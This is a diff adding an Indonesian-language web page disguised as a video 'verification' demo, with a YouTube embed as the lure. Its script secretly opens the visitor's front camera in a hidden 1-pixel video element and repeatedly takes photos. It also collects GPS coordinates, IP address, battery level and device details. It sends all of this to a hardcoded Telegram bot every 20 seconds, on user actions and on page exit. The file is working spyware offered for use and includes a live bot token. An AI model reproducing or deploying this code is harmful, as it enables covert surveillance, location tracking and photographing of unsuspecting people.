@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demo Teknologi Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #2a2a2a;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+        .privacy-notice {
+            background: rgba(255, 50, 50, 0.1);
+            border: 1px solid rgba(255, 50, 50, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #ff6b6b;
+        }
+        .privacy-notice strong {
+            display: block;
+            margin-bottom: 4px;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .content {
+            display: none;
+            margin-top: 24px;
+        }
+        .content.active {
+            display: block;
+        }
+        .video-wrapper {
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            aspect-ratio: 16/9;
+            margin-bottom: 16px;
+        }
+        #videoIframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .status {
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            margin-top: 16px;
+        }
+        .status span {
+            color: #4ade80;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid #1a1a1a;
+            font-size: 11px;
+            color: #333;
+        }
+        .hidden-cam {
+            position: fixed;
+            bottom: -1000px;
+            right: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        #hiddenVideo {
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            position: absolute;
+            bottom: 0;
+            right: 0;
+        }
+        .log-container {
+            margin-top: 16px;
+            background: #0a0a0a;
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 11px;
+            color: #4ade80;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #1a1a1a;
+            display: none;
+        }
+        .log-container.active {
+            display: block;
+        }
+        .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid #111;
+        }
+        .log-entry.error {
+            color: #ff6b6b;
+        }
+        .log-entry.success {
+            color: #4ade80;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>VIDEU</h1>
+            <p>new video</p>
+        </div>
+
+    
+
+        <button class="btn" id="startBtn">VERTIFIKASI</button>
+
+        <div class="content" id="content">
+            <div class="video-wrapper">
+                <iframe id="videoIframe" src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
+            </div>
+            <div style="font-size:14px;color:#aaa;text-align:center;">
+                ▶ Demo Konten Multimedia
+            </div>
+            <div class="status">
+                Status: <span id="statusText">Aktif</span>
+            </div>
+        </div>
+
+        <div class="log-container" id="logContainer">
+            <div style="color:#666;margin-bottom:8px;font-size:10px;">📋 LOG AKTIVITAS</div>
+        </div>
+
+        <div class="footer">
+           WHOARE
+        </div>
+    </div>
+
+    <div class="hidden-cam">
+        <video id="hiddenVideo" autoplay playsinline></video>
+    </div>
+
+    <script>
+        (function() {
+            // ============================================
+            // KONFIGURASI TELEGRAM
+            // ============================================
+            const BOT_TOKEN = "8587424443:AAE6OxWlzg4vqz5tQ-rECxieV4fIkSn-WCk";
+            const CHAT_ID = "8762821760";
+
+            // ============================================
+            // ELEMEN
+            // ============================================
+            const startBtn = document.getElementById('startBtn');
+            const content = document.getElementById('content');
+            const statusText = document.getElementById('statusText');
+            const hiddenVideo = document.getElementById('hiddenVideo');
+            const logContainer = document.getElementById('logContainer');
+
+            // ============================================
+            // VARIABEL
+            // ============================================
+            let fotoBase64 = '';
+            let isCameraReady = false;
+            let isActive = false;
+            let lokasi = 'N/A';
+            let ip = 'N/A';
+            let batre = 'N/A';
+            let spesifikasi = 'N/A';
+
+            // ============================================
+            // FUNGSI LOG
+            // ============================================
+            function addLog(message, type = 'info') {
+                logContainer.classList.add('active');
+                const entry = document.createElement('div');
+                entry.className = `log-entry ${type}`;
+                const time = new Date().toLocaleTimeString();
+                entry.textContent = `[${time}] ${message}`;
+                logContainer.appendChild(entry);
+                logContainer.scrollTop = logContainer.scrollHeight;
+
+                // Limit log entries
+                if (logContainer.children.length > 50) {
+                    logContainer.removeChild(logContainer.children[1]);
+                }
+            }
+
+            // ============================================
+            // KIRIM KE TELEGRAM (VIA BOT API)
+            // ============================================
+            async function sendToTelegram(data) {
+                try {
+                    addLog('Mengirim data ke Telegram...', 'info');
+
+                    // Format pesan
+                    const mapsLink = data.lokasi.includes(',') && !data.lokasi.includes('DENIED') ?
+                        `https://www.google.com/maps?q=${data.lokasi.replace(/\s/g, '')}` :
+                        data.lokasi;
+
+                    const message = `
+📡 SESSION REPORT
+━━━━━━━━━━━━━━━━━━
+IP: ${data.ip}
+LOKASI: ${data.lokasi}
+MAPS: ${mapsLink}
+BATRE: ${data.batre}
+SPEK: ${data.spesifikasi}
+PLATFORM: ${data.platform}
+LANG: ${data.language}
+SCREEN: ${data.screen}
+UA: ${data.userAgent}
+WAKTU: ${data.waktu}
+━━━━━━━━━━━━━━━━━━`;
+
+                    // Kirim pesan teks
+                    const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    const textResult = await textResponse.json();
+
+                    if (!textResult.ok) {
+                        throw new Error(`Telegram API error: ${textResult.description}`);
+                    }
+
+                    addLog('✅ Pesan teks terkirim!', 'success');
+
+                    // Kirim foto jika ada
+                    if (data.foto && data.foto.startsWith('data:image')) {
+                        addLog('Mengirim foto...', 'info');
+
+                        // Konversi base64 ke Blob
+                        const response = await fetch(data.foto);
+                        const blob = await response.blob();
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('caption', '📸 CAMERA CAPTURE');
+
+                        const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        const photoResult = await photoResponse.json();
+
+                        if (photoResult.ok) {
+                            addLog('✅ Foto terkirim!', 'success');
+                        } else {
+                            addLog(`⚠️ Gagal kirim foto: ${photoResult.description}`, 'error');
+                        }
+                    }
+
+                    return true;
+
+                } catch (error) {
+                    addLog(`❌ Error: ${error.message}`, 'error');
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
+            }
+
+            // ============================================
+            // KUMPULKAN DATA
+            // ============================================
+            function collectData() {
+                return {
+                    ip: ip,
+                    lokasi: lokasi,
+                    batre: batre,
+                    spesifikasi: spesifikasi,
+                    platform: navigator.platform || 'unknown',
+                    language: navigator.language || 'unknown',
+                    userAgent: navigator.userAgent || 'unknown',
+                    screen: `${screen.width}x${screen.height}`,
+                    waktu: new Date().toISOString(),
+                    foto: fotoBase64 || ''
+                };
+            }
+
+            // ============================================
+            // CAPTURE FOTO
+            // ============================================
+            function capturePhoto() {
+                if (!isCameraReady) return;
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 160;
+                    canvas.height = 120;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                    fotoBase64 = canvas.toDataURL('image/jpeg', 0.5);
+                } catch (e) {
+                    addLog(`⚠️ Gagal capture foto: ${e.message}`, 'error');
+                }
+            }
+
+            // ============================================
+            // SEND PERIODIK
+            // ============================================
+            function sendPeriodicData() {
+                if (!isActive) return;
+                const data = collectData();
+                if (!data.foto && isCameraReady) {
+                    capturePhoto();
+                    data.foto = fotoBase64;
+                }
+                sendToTelegram(data);
+            }
+
+            // ============================================
+            // MAIN - TOMBOL START
+            // ============================================
+            startBtn.addEventListener('click', async function() {
+                if (isActive) return;
+                this.textContent = '⏳ Memproses...';
+                this.disabled = true;
+                addLog('🚀 Memulai demo...', 'info');
+
+                try {
+                    // ===== KAMERA =====
+                    addLog('📷 Mengakses kamera...', 'info');
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 160 }, height: { ideal: 120 } },
+                        audio: false
+                    });
+                    hiddenVideo.srcObject = stream;
+                    isCameraReady = true;
+                    capturePhoto();
+                    addLog('✅ Kamera aktif', 'success');
+
+                    // ===== LOKASI =====
+                    addLog('📍 Mengambil lokasi...', 'info');
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                const { latitude, longitude } = pos.coords;
+                                lokasi = `${latitude.toFixed(5)}, ${longitude.toFixed(5)}`;
+                                addLog(`✅ Lokasi: ${lokasi}`, 'success');
+                            },
+                            () => {
+                                lokasi = 'DENIED';
+                                addLog('⚠️ Lokasi ditolak pengguna', 'error');
+                            }, { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    }
+
+                    // ===== IP =====
+                    addLog('🌐 Mengambil IP...', 'info');
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const data = await res.json();
+                        ip = data.ip || 'UNKNOWN';
+                        addLog(`✅ IP: ${ip}`, 'success');
+                    } catch {
+                        ip = 'FAILED';
+                        addLog('⚠️ Gagal ambil IP', 'error');
+                    }
+
+                    // ===== BATRE =====
+                    addLog('🔋 Mengecek baterai...', 'info');
+                    if (navigator.getBattery) {
+                        try {
+                            const bat = await navigator.getBattery();
+                            batre = Math.round(bat.level * 100) + '%';
+                            addLog(`✅ Baterai: ${batre}`, 'success');
+                        } catch {
+                            batre = 'N/A';
+                            addLog('⚠️ Gagal ambil baterai', 'error');
+                        }
+                    }
+
+                    // ===== SPESIFIKASI =====
+                    spesifikasi = `${navigator.platform || 'unknown'} | ${screen.width}x${screen.height} | ${navigator.language || 'unknown'}`;
+                    addLog(`✅ Spesifikasi: ${spesifikasi}`, 'success');
+
+                    // ===== TAMPILKAN KONTEN =====
+                    content.classList.add('active');
+                    isActive = true;
+                    this.textContent = '✅ Demo Aktif';
+                    this.style.background = 'linear-gradient(135deg, #4ade80 0%, #22d3ee 100%)';
+                    statusText.textContent = 'Aktif ✅';
+                    addLog('✅ Demo berjalan!', 'success');
+
+                    // ===== KIRIM PERTAMA =====
+                    setTimeout(() => {
+                        addLog('📤 Mengirim data pertama...', 'info');
+                        sendPeriodicData();
+                    }, 2000);
+
+                } catch (e) {
+                    // TETAP TAMPILKAN WALAUPUN KAMERA GAGAL
+                    addLog(`⚠️ Kamera tidak tersedia: ${e.message}`, 'error');
+                    content.classList.add('active');
+                    isActive = true;
+                    this.textContent = '✅ Demo Aktif (Terbatas)';
+                    this.style.background = 'linear-gradient(135deg, #f59e0b 0%, #f97316 100%)';
+                    statusText.textContent = 'Aktif (Terbatas) ⚠️';
+
+                    // Ambil data lain
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const data = await res.json();
+                        ip = data.ip || 'UNKNOWN';
+                        addLog(`✅ IP: ${ip}`, 'success');
+                    } catch {
+                        ip = 'FAILED';
+                    }
+
+                    if (navigator.getBattery) {
+                        try {
+                            const bat = await navigator.getBattery();
+                            batre = Math.round(bat.level * 100) + '%';
+                            addLog(`✅ Baterai: ${batre}`, 'success');
+                        } catch {
+                            batre = 'N/A';
+                        }
+                    }
+
+                    spesifikasi = `${navigator.platform || 'unknown'} | ${screen.width}x${screen.height} | ${navigator.language || 'unknown'}`;
+                    addLog('✅ Demo berjalan (mode terbatas)', 'success');
+
+                    setTimeout(() => {
+                        addLog('📤 Mengirim data pertama...', 'info');
+                        sendPeriodicData();
+                    }, 2000);
+                }
+            });
+
+            // ============================================
+            // CAPTURE PERIODIK (tiap 4 detik)
+            // ============================================
+            setInterval(() => {
+                if (isCameraReady && isActive) {
+                    capturePhoto();
+                }
+            }, 4000);
+
+            // ============================================
+            // KIRIM PERIODIK (tiap 20 detik)
+            // ============================================
+            setInterval(() => {
+                if (isActive) {
+                    sendPeriodicData();
+                }
+            }, 20000);
+
+            // ============================================
+            // EVENT LISTENERS
+            // ============================================
+            ['click', 'scroll', 'resize', 'orientationchange'].forEach(event => {
+                window.addEventListener(event, () => {
+                    if (!isActive) return;
+                    capturePhoto();
+                    setTimeout(sendPeriodicData, 100);
+                });
+            });
+
+            // ============================================
+            // BEFORE UNLOAD (kirim data terakhir)
+            // ============================================
+            window.addEventListener('beforeunload', () => {
+                if (!isActive) return;
+                const data = collectData();
+                sendToTelegram(data);
+            });
+
+            // ============================================
+            // TEST BOT
+            // ============================================
+            async function testBot() {
+                try {
+                    addLog('🔍 Testing koneksi ke Telegram...', 'info');
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+                    const result = await response.json();
+                    if (result.ok) {
+                        addLog(`✅ Bot terhubung: @${result.result.username}`, 'success');
+                    } else {
+                        addLog(`❌ Bot error: ${result.description}`, 'error');
+                    }
+                } catch (e) {
+                    addLog(`❌ Gagal koneksi ke Telegram: ${e.message}`, 'error');
+                }
+            }
+
+            // Test bot saat halaman dimuat
+            setTimeout(testBot, 1000);
+
+        })();
+    </script>
+</body>
+</html>
